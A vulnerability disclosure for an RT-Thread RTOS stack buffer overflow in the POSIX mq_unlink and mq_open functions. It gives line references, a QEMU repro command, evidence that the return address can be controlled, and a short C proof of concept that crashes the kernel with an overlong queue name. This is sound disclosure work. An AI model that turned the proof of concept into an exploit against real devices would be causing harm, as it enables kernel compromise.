# Vulnerability 2: POSIX mqueue Stack Buffer Overflow

Issue: [RT-Thread/rt-thread#11736](https://github.com/RT-Thread/rt-thread/issues/11736)
Target: RT-Thread master `6ea6827`, bsp/qemu-vexpress-a9, default configuration
Repro: `qemu-system-arm -M vexpress-a9 -kernel rtthread.elf -sd sd.bin -nographic`

## Description

`components/libc/posix/ipc/mqueue.c` formats the queue name into a 28-byte
stack buffer `char mq_name[RT_NAME_MAX + 12]`:

- `mq_unlink()` (:465-475) performs **no length check at all**:
  `rt_sprintf(mq_name, "%s%s", "/dev/mqueue/", name)` writes unboundedly for
  any name longer than 16 characters — a stack overflow of arbitrary length
  and content;
- `mq_open()` (:121, :164-166) is off by one: it rejects only
  `strlen(name) > RT_NAME_MAX`, so a 16-character name writes 29 bytes
  (including the NUL) into the 28-byte buffer;
- Additional defects on the same path: the `attr` vararg is dereferenced
  without a NULL check under `O_CREAT` (:139, :152-153), and `fd_get()`
  results are dereferenced without NULL checks at six call sites.

`mq_*` are `RTM_EXPORT` public APIs callable by any thread; default builds
have no stack protector, and under `RT_USING_SMART` this is an
unprivileged-application → kernel stack corruption.

Reproduced result: calling `mq_unlink` with a 200-character name →
**prefetch abort** with the return address set to `0x4d4d4d4c`
('MMMM' — attacker bytes).

## Screenshot

![mq_unlink stack overflow](https://raw.githubusercontent.com/REYu6/rt-thread-poc-evidence/main/mq.png)

## PoC

```c
static void poc_mq(int argc, char **argv)
{
    char name[512];
    int i;

    for (i = 0; i < 200; i++) name[i] = 'M';
    name[200] = '\0';

    rt_kprintf("[poc] mq_unlink with 200-char name (buffer is 28 bytes)...\n");
    mq_unlink(name);
    rt_kprintf("[poc] mq_unlink RETURNED (no crash)\n");
}
MSH_CMD_EXPORT(poc_mq, trigger mq_unlink long-name stack overflow);
```

Run `poc_mq` from the console.
